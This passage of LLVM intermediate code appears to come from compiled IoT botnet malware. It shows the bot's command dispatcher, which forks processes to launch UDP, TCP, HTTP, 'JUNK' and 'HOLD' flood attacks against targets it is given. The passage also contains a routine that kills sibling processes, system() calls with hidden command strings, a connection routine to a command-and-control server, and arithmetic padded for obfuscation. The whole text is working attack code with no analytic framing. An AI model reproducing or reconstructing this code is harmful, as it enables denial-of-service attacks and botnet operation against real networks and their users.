; <label>:252:                                    ; preds = %246
  %253 = load i8**, i8*** %4, align 8
  %254 = getelementptr inbounds i8*, i8** %253, i64 2
  %255 = load i8*, i8** %254, align 8
  %256 = call i32 @atoi(i8* %255) #10
  %257 = icmp eq i32 %256, -1
  br i1 %257, label %279, label %258

; <label>:258:                                    ; preds = %252
  %259 = load i8**, i8*** %4, align 8
  %260 = getelementptr inbounds i8*, i8** %259, i64 4
  %261 = load i8*, i8** %260, align 8
  %262 = call i32 @atoi(i8* %261) #10
  %263 = icmp eq i32 %262, -1
  br i1 %263, label %279, label %264

; <label>:264:                                    ; preds = %258
  %265 = load i8**, i8*** %4, align 8
  %266 = getelementptr inbounds i8*, i8** %265, i64 4
  %267 = load i8*, i8** %266, align 8
  %268 = call i32 @atoi(i8* %267) #10
  %269 = icmp sgt i32 %268, 1024
  br i1 %269, label %279, label %270

; <label>:270:                                    ; preds = %264
  %271 = load i32, i32* %3, align 4
  %272 = icmp eq i32 %271, 6
  br i1 %272, label %273, label %280

; <label>:273:                                    ; preds = %270
  %274 = load i8**, i8*** %4, align 8
  %275 = getelementptr inbounds i8*, i8** %274, i64 5
  %276 = load i8*, i8** %275, align 8
  %277 = call i32 @atoi(i8* %276) #10
  %278 = icmp slt i32 %277, 1
  br i1 %278, label %279, label %280

; <label>:279:                                    ; preds = %273, %264, %258, %252, %246, %243
  br label %699

; <label>:280:                                    ; preds = %273, %270
  %281 = load i8**, i8*** %4, align 8
  %282 = getelementptr inbounds i8*, i8** %281, i64 1
  %283 = load i8*, i8** %282, align 8
  store i8* %283, i8** %15, align 8
  %284 = load i8**, i8*** %4, align 8
  %285 = getelementptr inbounds i8*, i8** %284, i64 2
  %286 = load i8*, i8** %285, align 8
  %287 = call i32 @atoi(i8* %286) #10
  store i32 %287, i32* %16, align 4
  %288 = load i8**, i8*** %4, align 8
  %289 = getelementptr inbounds i8*, i8** %288, i64 3
  %290 = load i8*, i8** %289, align 8
  %291 = call i32 @atoi(i8* %290) #10
  store i32 %291, i32* %17, align 4
  %292 = load i8**, i8*** %4, align 8
  %293 = getelementptr inbounds i8*, i8** %292, i64 4
  %294 = load i8*, i8** %293, align 8
  %295 = call i32 @atoi(i8* %294) #10
  store i32 %295, i32* %18, align 4
  %296 = load i32, i32* %3, align 4
  %297 = icmp eq i32 %296, 6
  br i1 %297, label %298, label %303

; <label>:298:                                    ; preds = %280
  %299 = load i8**, i8*** %4, align 8
  %300 = getelementptr inbounds i8*, i8** %299, i64 5
  %301 = load i8*, i8** %300, align 8
  %302 = call i32 @atoi(i8* %301) #10
  br label %304

; <label>:303:                                    ; preds = %280
  br label %304

; <label>:304:                                    ; preds = %303, %298
  %305 = phi i32 [ %302, %298 ], [ 10, %303 ]
  store i32 %305, i32* %19, align 4
  store i32 32, i32* %20, align 4
  %306 = load i8*, i8** %15, align 8
  %307 = call i8* @strstr(i8* %306, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #10
  %308 = icmp ne i8* %307, null
  br i1 %308, label %309, label %328

; <label>:309:                                    ; preds = %304
  %310 = load i8*, i8** %15, align 8
  %311 = call i8* @strtok(i8* %310, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #2
  store i8* %311, i8** %21, align 8
  br label %312

; <label>:312:                                    ; preds = %325, %309
  %313 = load i8*, i8** %21, align 8
  %314 = icmp ne i8* %313, null
  br i1 %314, label %315, label %327

; <label>:315:                                    ; preds = %312
  %316 = call i32 @listFork()
  %317 = icmp ne i32 %316, 0
  br i1 %317, label %325, label %318

; <label>:318:                                    ; preds = %315
  %319 = load i8*, i8** %21, align 8
  %320 = load i32, i32* %16, align 4
  %321 = load i32, i32* %17, align 4
  %322 = load i32, i32* %18, align 4
  %323 = load i32, i32* %19, align 4
  %324 = load i32, i32* %20, align 4
  call void @sendUDP(i8* %319, i32 %320, i32 %321, i32 %322, i32 %323, i32 %324)
  call void @_exit(i32 0) #12
  unreachable

; <label>:325:                                    ; preds = %315
  %326 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #2
  store i8* %326, i8** %21, align 8
  br label %312

; <label>:327:                                    ; preds = %312
  br label %339

; <label>:328:                                    ; preds = %304
  %329 = call i32 @listFork()
  %330 = icmp ne i32 %329, 0
  br i1 %330, label %331, label %332

; <label>:331:                                    ; preds = %328
  br label %699

; <label>:332:                                    ; preds = %328
  %333 = load i8*, i8** %15, align 8
  %334 = load i32, i32* %16, align 4
  %335 = load i32, i32* %17, align 4
  %336 = load i32, i32* %18, align 4
  %337 = load i32, i32* %19, align 4
  %338 = load i32, i32* %20, align 4
  call void @sendUDP(i8* %333, i32 %334, i32 %335, i32 %336, i32 %337, i32 %338)
  call void @_exit(i32 0) #12
  unreachable

; <label>:339:                                    ; preds = %327
  br label %340

; <label>:340:                                    ; preds = %339, %237
  %341 = load i8**, i8*** %4, align 8
  %342 = getelementptr inbounds i8*, i8** %341, i64 0
  %343 = load i8*, i8** %342, align 8
  %344 = call i32 @strcmp(i8* %343, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.102, i32 0, i32 0)) #10
  %345 = icmp ne i32 %344, 0
  br i1 %345, label %389, label %346

; <label>:346:                                    ; preds = %340
  %347 = load i32, i32* %3, align 4
  %348 = icmp slt i32 %347, 6
  br i1 %348, label %361, label %349

; <label>:349:                                    ; preds = %346
  %350 = load i8**, i8*** %4, align 8
  %351 = getelementptr inbounds i8*, i8** %350, i64 3
  %352 = load i8*, i8** %351, align 8
  %353 = call i32 @atoi(i8* %352) #10
  %354 = icmp slt i32 %353, 1
  br i1 %354, label %361, label %355

; <label>:355:                                    ; preds = %349
  %356 = load i8**, i8*** %4, align 8
  %357 = getelementptr inbounds i8*, i8** %356, i64 5
  %358 = load i8*, i8** %357, align 8
  %359 = call i32 @atoi(i8* %358) #10
  %360 = icmp slt i32 %359, 1
  br i1 %360, label %361, label %362

; <label>:361:                                    ; preds = %355, %349, %346
  br label %699

; <label>:362:                                    ; preds = %355
  %363 = call i32 @listFork()
  %364 = icmp ne i32 %363, 0
  br i1 %364, label %365, label %366

; <label>:365:                                    ; preds = %362
  br label %699

; <label>:366:                                    ; preds = %362
  %367 = load i8**, i8*** %4, align 8
  %368 = getelementptr inbounds i8*, i8** %367, i64 1
  %369 = load i8*, i8** %368, align 8
  %370 = load i8**, i8*** %4, align 8
  %371 = getelementptr inbounds i8*, i8** %370, i64 2
  %372 = load i8*, i8** %371, align 8
  %373 = load i8**, i8*** %4, align 8
  %374 = getelementptr inbounds i8*, i8** %373, i64 3
  %375 = load i8*, i8** %374, align 8
  %376 = call i32 @atoi(i8* %375) #10
  %377 = trunc i32 %376 to i16
  %378 = load i8**, i8*** %4, align 8
  %379 = getelementptr inbounds i8*, i8** %378, i64 4
  %380 = load i8*, i8** %379, align 8
  %381 = load i8**, i8*** %4, align 8
  %382 = getelementptr inbounds i8*, i8** %381, i64 5
  %383 = load i8*, i8** %382, align 8
  %384 = call i32 @atoi(i8* %383) #10
  %385 = load i8**, i8*** %4, align 8
  %386 = getelementptr inbounds i8*, i8** %385, i64 6
  %387 = load i8*, i8** %386, align 8
  %388 = call i32 @atoi(i8* %387) #10
  call void @sendHTTP(i8* %369, i8* %372, i16 zeroext %377, i8* %380, i32 %384, i32 %388)
  call void @exit(i32 0) #14
  unreachable

; <label>:389:                                    ; preds = %340
  %390 = load i8**, i8*** %4, align 8
  %391 = getelementptr inbounds i8*, i8** %390, i64 0
  %392 = load i8*, i8** %391, align 8
  %393 = call i32 @strcmp(i8* %392, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.103, i32 0, i32 0)) #10
  %394 = icmp ne i32 %393, 0
  br i1 %394, label %453, label %395

; <label>:395:                                    ; preds = %389
  %396 = load i32, i32* %3, align 4
  %397 = icmp slt i32 %396, 4
  br i1 %397, label %410, label %398

; <label>:398:                                    ; preds = %395
  %399 = load i8**, i8*** %4, align 8
  %400 = getelementptr inbounds i8*, i8** %399, i64 2
  %401 = load i8*, i8** %400, align 8
  %402 = call i32 @atoi(i8* %401) #10
  %403 = icmp slt i32 %402, 1
  br i1 %403, label %410, label %404

; <label>:404:                                    ; preds = %398
  %405 = load i8**, i8*** %4, align 8
  %406 = getelementptr inbounds i8*, i8** %405, i64 3
  %407 = load i8*, i8** %406, align 8
  %408 = call i32 @atoi(i8* %407) #10
  %409 = icmp slt i32 %408, 1
  br i1 %409, label %410, label %411

; <label>:410:                                    ; preds = %404, %398, %395
  br label %699

; <label>:411:                                    ; preds = %404
  %412 = load i8**, i8*** %4, align 8
  %413 = getelementptr inbounds i8*, i8** %412, i64 1
  %414 = load i8*, i8** %413, align 8
  store i8* %414, i8** %22, align 8
  %415 = load i8**, i8*** %4, align 8
  %416 = getelementptr inbounds i8*, i8** %415, i64 2
  %417 = load i8*, i8** %416, align 8
  %418 = call i32 @atoi(i8* %417) #10
  store i32 %418, i32* %23, align 4
  %419 = load i8**, i8*** %4, align 8
  %420 = getelementptr inbounds i8*, i8** %419, i64 3
  %421 = load i8*, i8** %420, align 8
  %422 = call i32 @atoi(i8* %421) #10
  store i32 %422, i32* %24, align 4
  %423 = load i8*, i8** %22, align 8
  %424 = call i8* @strstr(i8* %423, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #10
  %425 = icmp ne i8* %424, null
  br i1 %425, label %426, label %444

; <label>:426:                                    ; preds = %411
  %427 = load i8*, i8** %22, align 8
  %428 = call i8* @strtok(i8* %427, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #2
  store i8* %428, i8** %25, align 8
  br label %429

; <label>:429:                                    ; preds = %441, %426
  %430 = load i8*, i8** %25, align 8
  %431 = icmp ne i8* %430, null
  br i1 %431, label %432, label %443

; <label>:432:                                    ; preds = %429
  %433 = call i32 @listFork()
  %434 = icmp ne i32 %433, 0
  br i1 %434, label %441, label %435

; <label>:435:                                    ; preds = %432
  %436 = load i8*, i8** %25, align 8
  %437 = load i32, i32* %23, align 4
  %438 = load i32, i32* %24, align 4
  call void @sendCNC(i8* %436, i32 %437, i32 %438)
  %439 = load i32, i32* @mainCommSock, align 4
  %440 = call i32 @close(i32 %439)
  call void @_exit(i32 0) #12
  unreachable

; <label>:441:                                    ; preds = %432
  %442 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #2
  store i8* %442, i8** %25, align 8
  br label %429

; <label>:443:                                    ; preds = %429
  br label %452

; <label>:444:                                    ; preds = %411
  %445 = call i32 @listFork()
  %446 = icmp ne i32 %445, 0
  br i1 %446, label %447, label %448

; <label>:447:                                    ; preds = %444
  br label %699

; <label>:448:                                    ; preds = %444
  %449 = load i8*, i8** %22, align 8
  %450 = load i32, i32* %23, align 4
  %451 = load i32, i32* %24, align 4
  call void @sendCNC(i8* %449, i32 %450, i32 %451)
  call void @_exit(i32 0) #12
  unreachable

; <label>:452:                                    ; preds = %443
  br label %453

; <label>:453:                                    ; preds = %452, %389
  %454 = load i8**, i8*** %4, align 8
  %455 = getelementptr inbounds i8*, i8** %454, i64 0
  %456 = load i8*, i8** %455, align 8
  %457 = call i32 @strcmp(i8* %456, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.104, i32 0, i32 0)) #10
  %458 = icmp ne i32 %457, 0
  br i1 %458, label %523, label %459

; <label>:459:                                    ; preds = %453
  %460 = load i32, i32* %3, align 4
  %461 = icmp slt i32 %460, 4
  br i1 %461, label %474, label %462

; <label>:462:                                    ; preds = %459
  %463 = load i8**, i8*** %4, align 8
  %464 = getelementptr inbounds i8*, i8** %463, i64 2
  %465 = load i8*, i8** %464, align 8
  %466 = call i32 @atoi(i8* %465) #10
  %467 = icmp slt i32 %466, 1
  br i1 %467, label %474, label %468

; <label>:468:                                    ; preds = %462
  %469 = load i8**, i8*** %4, align 8
  %470 = getelementptr inbounds i8*, i8** %469, i64 3
  %471 = load i8*, i8** %470, align 8
  %472 = call i32 @atoi(i8* %471) #10
  %473 = icmp slt i32 %472, 1
  br i1 %473, label %474, label %475

; <label>:474:                                    ; preds = %468, %462, %459
  br label %699

; <label>:475:                                    ; preds = %468
  %476 = load i8**, i8*** %4, align 8
  %477 = getelementptr inbounds i8*, i8** %476, i64 1
  %478 = load i8*, i8** %477, align 8
  store i8* %478, i8** %26, align 8
  %479 = load i8**, i8*** %4, align 8
  %480 = getelementptr inbounds i8*, i8** %479, i64 2
  %481 = load i8*, i8** %480, align 8
  %482 = call i32 @atoi(i8* %481) #10
  store i32 %482, i32* %27, align 4
  %483 = load i8**, i8*** %4, align 8
  %484 = getelementptr inbounds i8*, i8** %483, i64 3
  %485 = load i8*, i8** %484, align 8
  %486 = call i32 @atoi(i8* %485) #10
  store i32 %486, i32* %28, align 4
  %487 = load i8*, i8** %26, align 8
  %488 = call i8* @strstr(i8* %487, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #10
  %489 = icmp ne i8* %488, null
  br i1 %489, label %490, label %511

; <label>:490:                                    ; preds = %475
  %491 = load i8*, i8** %26, align 8
  %492 = call i8* @strtok(i8* %491, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #2
  store i8* %492, i8** %29, align 8
  br label %493

; <label>:493:                                    ; preds = %508, %490
  %494 = load i8*, i8** %29, align 8
  %495 = icmp ne i8* %494, null
  br i1 %495, label %496, label %510

; <label>:496:                                    ; preds = %493
  %497 = call i32 @listFork()
  %498 = icmp ne i32 %497, 0
  br i1 %498, label %508, label %499

; <label>:499:                                    ; preds = %496
  %500 = load i8*, i8** %29, align 8
  %501 = load i32, i32* %27, align 4
  %502 = load i32, i32* %28, align 4
  call void @sendJUNK(i8* %500, i32 %501, i32 %502)
  %503 = load i8*, i8** %29, align 8
  %504 = load i32, i32* %27, align 4
  %505 = load i32, i32* %28, align 4
  call void @sendHOLD(i8* %503, i32 %504, i32 %505)
  %506 = load i32, i32* @mainCommSock, align 4
  %507 = call i32 @close(i32 %506)
  call void @_exit(i32 0) #12
  unreachable

; <label>:508:                                    ; preds = %496
  %509 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #2
  store i8* %509, i8** %29, align 8
  br label %493

; <label>:510:                                    ; preds = %493
  br label %522

; <label>:511:                                    ; preds = %475
  %512 = call i32 @listFork()
  %513 = icmp ne i32 %512, 0
  br i1 %513, label %514, label %515

; <label>:514:                                    ; preds = %511
  br label %699

; <label>:515:                                    ; preds = %511
  %516 = load i8*, i8** %26, align 8
  %517 = load i32, i32* %27, align 4
  %518 = load i32, i32* %28, align 4
  call void @sendJUNK(i8* %516, i32 %517, i32 %518)
  %519 = load i8*, i8** %26, align 8
  %520 = load i32, i32* %27, align 4
  %521 = load i32, i32* %28, align 4
  call void @sendHOLD(i8* %519, i32 %520, i32 %521)
  call void @_exit(i32 0) #12
  unreachable

; <label>:522:                                    ; preds = %510
  br label %523

; <label>:523:                                    ; preds = %522, %453
  %524 = load i8**, i8*** %4, align 8
  %525 = getelementptr inbounds i8*, i8** %524, i64 0
  %526 = load i8*, i8** %525, align 8
  %527 = call i32 @strcmp(i8* %526, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.105, i32 0, i32 0)) #10
  %528 = icmp ne i32 %527, 0
  br i1 %528, label %634, label %529

; <label>:529:                                    ; preds = %523
  %530 = load i32, i32* %3, align 4
  %531 = icmp slt i32 %530, 6
  br i1 %531, label %562, label %532

; <label>:532:                                    ; preds = %529
  %533 = load i8**, i8*** %4, align 8
  %534 = getelementptr inbounds i8*, i8** %533, i64 3
  %535 = load i8*, i8** %534, align 8
  %536 = call i32 @atoi(i8* %535) #10
  %537 = icmp eq i32 %536, -1
  br i1 %537, label %562, label %538

; <label>:538:                                    ; preds = %532
  %539 = load i8**, i8*** %4, align 8
  %540 = getelementptr inbounds i8*, i8** %539, i64 2
  %541 = load i8*, i8** %540, align 8
  %542 = call i32 @atoi(i8* %541) #10
  %543 = icmp eq i32 %542, -1
  br i1 %543, label %562, label %544

; <label>:544:                                    ; preds = %538
  %545 = load i32, i32* %3, align 4
  %546 = icmp sgt i32 %545, 5
  br i1 %546, label %547, label %553

; <label>:547:                                    ; preds = %544
  %548 = load i8**, i8*** %4, align 8
  %549 = getelementptr inbounds i8*, i8** %548, i64 5
  %550 = load i8*, i8** %549, align 8
  %551 = call i32 @atoi(i8* %550) #10
  %552 = icmp slt i32 %551, 0
  br i1 %552, label %562, label %553

; <label>:553:                                    ; preds = %547, %544
  %554 = load i32, i32* %3, align 4
  %555 = icmp eq i32 %554, 7
  br i1 %555, label %556, label %563

; <label>:556:                                    ; preds = %553
  %557 = load i8**, i8*** %4, align 8
  %558 = getelementptr inbounds i8*, i8** %557, i64 6
  %559 = load i8*, i8** %558, align 8
  %560 = call i32 @atoi(i8* %559) #10
  %561 = icmp slt i32 %560, 1
  br i1 %561, label %562, label %563

; <label>:562:                                    ; preds = %556, %547, %538, %532, %529
  br label %699

; <label>:563:                                    ; preds = %556, %553
  %564 = load i8**, i8*** %4, align 8
  %565 = getelementptr inbounds i8*, i8** %564, i64 1
  %566 = load i8*, i8** %565, align 8
  store i8* %566, i8** %30, align 8
  %567 = load i8**, i8*** %4, align 8
  %568 = getelementptr inbounds i8*, i8** %567, i64 2
  %569 = load i8*, i8** %568, align 8
  %570 = call i32 @atoi(i8* %569) #10
  store i32 %570, i32* %31, align 4
  %571 = load i8**, i8*** %4, align 8
  %572 = getelementptr inbounds i8*, i8** %571, i64 3
  %573 = load i8*, i8** %572, align 8
  %574 = call i32 @atoi(i8* %573) #10
  store i32 %574, i32* %32, align 4
  %575 = load i8**, i8*** %4, align 8
  %576 = getelementptr inbounds i8*, i8** %575, i64 4
  %577 = load i8*, i8** %576, align 8
  store i8* %577, i8** %33, align 8
  %578 = load i32, i32* %3, align 4
  %579 = icmp eq i32 %578, 7
  br i1 %579, label %580, label %585

; <label>:580:                                    ; preds = %563
  %581 = load i8**, i8*** %4, align 8
  %582 = getelementptr inbounds i8*, i8** %581, i64 6
  %583 = load i8*, i8** %582, align 8
  %584 = call i32 @atoi(i8* %583) #10
  br label %586

; <label>:585:                                    ; preds = %563
  br label %586

; <label>:586:                                    ; preds = %585, %580
  %587 = phi i32 [ %584, %580 ], [ 10, %585 ]
  store i32 %587, i32* %34, align 4
  %588 = load i32, i32* %3, align 4
  %589 = icmp sgt i32 %588, 5
  br i1 %589, label %590, label %595

; <label>:590:                                    ; preds = %586
  %591 = load i8**, i8*** %4, align 8
  %592 = getelementptr inbounds i8*, i8** %591, i64 5
  %593 = load i8*, i8** %592, align 8
  %594 = call i32 @atoi(i8* %593) #10
  br label %596

; <label>:595:                                    ; preds = %586
  br label %596

; <label>:596:                                    ; preds = %595, %590
  %597 = phi i32 [ %594, %590 ], [ 0, %595 ]
  store i32 %597, i32* %35, align 4
  store i32 32, i32* %36, align 4
  %598 = load i8*, i8** %30, align 8
  %599 = call i8* @strstr(i8* %598, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #10
  %600 = icmp ne i8* %599, null
  br i1 %600, label %601, label %621

; <label>:601:                                    ; preds = %596
  %602 = load i8*, i8** %30, align 8
  %603 = call i8* @strtok(i8* %602, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #2
  store i8* %603, i8** %37, align 8
  br label %604

; <label>:604:                                    ; preds = %618, %601
  %605 = load i8*, i8** %37, align 8
  %606 = icmp ne i8* %605, null
  br i1 %606, label %607, label %620

; <label>:607:                                    ; preds = %604
  %608 = call i32 @listFork()
  %609 = icmp ne i32 %608, 0
  br i1 %609, label %618, label %610

; <label>:610:                                    ; preds = %607
  %611 = load i8*, i8** %37, align 8
  %612 = load i32, i32* %31, align 4
  %613 = load i32, i32* %32, align 4
  %614 = load i8*, i8** %33, align 8
  %615 = load i32, i32* %35, align 4
  %616 = load i32, i32* %34, align 4
  %617 = load i32, i32* %36, align 4
  call void @sendTCP(i8* %611, i32 %612, i32 %613, i8* %614, i32 %615, i32 %616, i32 %617)
  call void @_exit(i32 0) #12
  unreachable

; <label>:618:                                    ; preds = %607
  %619 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #2
  store i8* %619, i8** %37, align 8
  br label %604

; <label>:620:                                    ; preds = %604
  br label %633

; <label>:621:                                    ; preds = %596
  %622 = call i32 @listFork()
  %623 = icmp ne i32 %622, 0
  br i1 %623, label %624, label %625

; <label>:624:                                    ; preds = %621
  br label %699

; <label>:625:                                    ; preds = %621
  %626 = load i8*, i8** %30, align 8
  %627 = load i32, i32* %31, align 4
  %628 = load i32, i32* %32, align 4
  %629 = load i8*, i8** %33, align 8
  %630 = load i32, i32* %35, align 4
  %631 = load i32, i32* %34, align 4
  %632 = load i32, i32* %36, align 4
  call void @sendTCP(i8* %626, i32 %627, i32 %628, i8* %629, i32 %630, i32 %631, i32 %632)
  call void @_exit(i32 0) #12
  unreachable

; <label>:633:                                    ; preds = %620
  br label %634

; <label>:634:                                    ; preds = %633, %523
  %635 = load i8**, i8*** %4, align 8
  %636 = getelementptr inbounds i8*, i8** %635, i64 0
  %637 = load i8*, i8** %636, align 8
  %638 = call i32 @strcmp(i8* %637, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.106, i32 0, i32 0)) #10
  %639 = icmp ne i32 %638, 0
  br i1 %639, label %677, label %640

; <label>:640:                                    ; preds = %634
  store i32 0, i32* %38, align 4
  store i64 0, i64* %39, align 8
  br label %641

; <label>:641:                                    ; preds = %670, %640
  %642 = load i64, i64* %39, align 8
  %643 = load i64, i64* @numpids, align 8
  %644 = icmp ult i64 %642, %643
  br i1 %644, label %645, label %676

; <label>:645:                                    ; preds = %641
  %646 = load i32*, i32** @pids, align 8
  %647 = load i64, i64* %39, align 8
  %648 = getelementptr inbounds i32, i32* %646, i64 %647
  %649 = load i32, i32* %648, align 4
  %650 = icmp ne i32 %649, 0
  br i1 %650, label %651, label %669

; <label>:651:                                    ; preds = %645
  %652 = load i32*, i32** @pids, align 8
  %653 = load i64, i64* %39, align 8
  %654 = getelementptr inbounds i32, i32* %652, i64 %653
  %655 = load i32, i32* %654, align 4
  %656 = call i32 @getpid() #2
  %657 = icmp ne i32 %655, %656
  br i1 %657, label %658, label %669

; <label>:658:                                    ; preds = %651
  %659 = load i32*, i32** @pids, align 8
  %660 = load i64, i64* %39, align 8
  %661 = getelementptr inbounds i32, i32* %659, i64 %660
  %662 = load i32, i32* %661, align 4
  %663 = call i32 @kill(i32 %662, i32 9) #2
  %664 = load i32, i32* %38, align 4
  %665 = add i32 %664, 2067122427
  %666 = add i32 %665, 1
  %667 = sub i32 %666, 2067122427
  %668 = add nsw i32 %664, 1
  store i32 %667, i32* %38, align 4
  br label %669

; <label>:669:                                    ; preds = %658, %651, %645
  br label %670

; <label>:670:                                    ; preds = %669
  %671 = load i64, i64* %39, align 8
  %672 = sub i64 %671, -7360744513344086042
  %673 = add i64 %672, 1
  %674 = add i64 %673, -7360744513344086042
  %675 = add i64 %671, 1
  store i64 %674, i64* %39, align 8
  br label %641

; <label>:676:                                    ; preds = %641
  br label %677

; <label>:677:                                    ; preds = %676, %634
  %678 = load i8**, i8*** %4, align 8
  %679 = getelementptr inbounds i8*, i8** %678, i64 0
  %680 = load i8*, i8** %679, align 8
  %681 = call i32 @strcmp(i8* %680, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.107, i32 0, i32 0)) #10
  %682 = icmp ne i32 %681, 0
  br i1 %682, label %684, label %683

; <label>:683:                                    ; preds = %677
  call void @exit(i32 0) #14
  unreachable

; <label>:684:                                    ; preds = %677
  %685 = load i8**, i8*** %4, align 8
  %686 = getelementptr inbounds i8*, i8** %685, i64 0
  %687 = load i8*, i8** %686, align 8
  %688 = call i32 @strcmp(i8* %687, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.108, i32 0, i32 0)) #10
  %689 = icmp ne i32 %688, 0
  br i1 %689, label %699, label %690

; <label>:690:                                    ; preds = %684
  %691 = call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.109, i32 0, i32 0))
  %692 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.110, i32 0, i32 0))
  %693 = call i32 @system(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.111, i32 0, i32 0))
  %694 = call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.112, i32 0, i32 0))
  %695 = call i32 @system(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.113, i32 0, i32 0))
  %696 = call i32 @system(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.114, i32 0, i32 0))
  %697 = call i32 @system(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.115, i32 0, i32 0))
  %698 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.116, i32 0, i32 0))
  br label %699

; <label>:699:                                    ; preds = %690, %684, %624, %562, %514, %474, %447, %410, %365, %361, %331, %279, %231, %194, %167, %132, %105, %100, %95, %80, %68, %54, %45
  ret void
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #4

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #1

; Function Attrs: nounwind
declare i32 @getpid() #4

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [4096 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 4096, i32 16, i1 false)
  %5 = load i32, i32* @mainCommSock, align 4
  %6 = icmp ne i32 %5, 0
  br i1 %6, label %7, label %10

; <label>:7:                                      ; preds = %0
  %8 = load i32, i32* @mainCommSock, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* @mainCommSock, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %0
  %11 = load i32, i32* @currentServer, align 4
  %12 = sub i32 0, 1
  %13 = sub i32 %11, %12
  %14 = add nsw i32 %11, 1
  %15 = sext i32 %13 to i64
  %16 = icmp eq i64 %15, 1
  br i1 %16, label %17, label %18

; <label>:17:                                     ; preds = %10
  store i32 0, i32* @currentServer, align 4
  br label %23

; <label>:18:                                     ; preds = %10
  %19 = load i32, i32* @currentServer, align 4
  %20 = sub i32 0, 1
  %21 = sub i32 %19, %20
  %22 = add nsw i32 %19, 1
  store i32 %21, i32* @currentServer, align 4
  br label %23

; <label>:23:                                     ; preds = %18, %17
  %24 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %25 = load i32, i32* @currentServer, align 4
  %26 = sext i32 %25 to i64
  %27 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %26
  %28 = load i8*, i8** %27, align 8
  %29 = call i8* @strcpy(i8* %24, i8* %28) #2
  store i32 23, i32* %3, align 4
  %30 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %31 = call i8* @strchr(i8* %30, i32 58) #10
  %32 = icmp ne i8* %31, null
  br i1 %32, label %33, label %40

; <label>:33:                                     ; preds = %23
  %34 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %35 = call i8* @strchr(i8* %34, i32 58) #10
  %36 = getelementptr inbounds i8, i8* %35, i64 1
  %37 = call i32 @atoi(i8* %36) #10
  store i32 %37, i32* %3, align 4
  %38 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %39 = call i8* @strchr(i8* %38, i32 58) #10
  store i8 0, i8* %39, align 1
  br label %40

; <label>:40:                                     ; preds = %33, %23
  %41 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %41, i32* @mainCommSock, align 4
  %42 = load i32, i32* @mainCommSock, align 4
  %43 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %44 = load i32, i32* %3, align 4
  %45 = call i32 @connectTimeout(i32 %42, i8* %43, i32 %44, i32 30)
  %46 = icmp ne i32 %45, 0
  br i1 %46, label %48, label %47

; <label>:47:                                     ; preds = %40
  store i32 1, i32* %1, align 4
  br label %49

; <label>:48:                                     ; preds = %40
  store i32 0, i32* %1, align 4
  br label %49

; <label>:49:                                     ; preds = %48, %47
  %50 = load i32, i32* %1, align 4
  ret i32 %50
}

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [4096 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.ifreq, align 8
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #2
  store i32 %12, i32* %2, align 4
  %13 = load i32, i32* %2, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %0
  store i32 0, i32* %1, align 4
  br label %103

; <label>:16:                                     ; preds = %0
  %17 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %17, i8 0, i64 16, i32 4, i1 false)
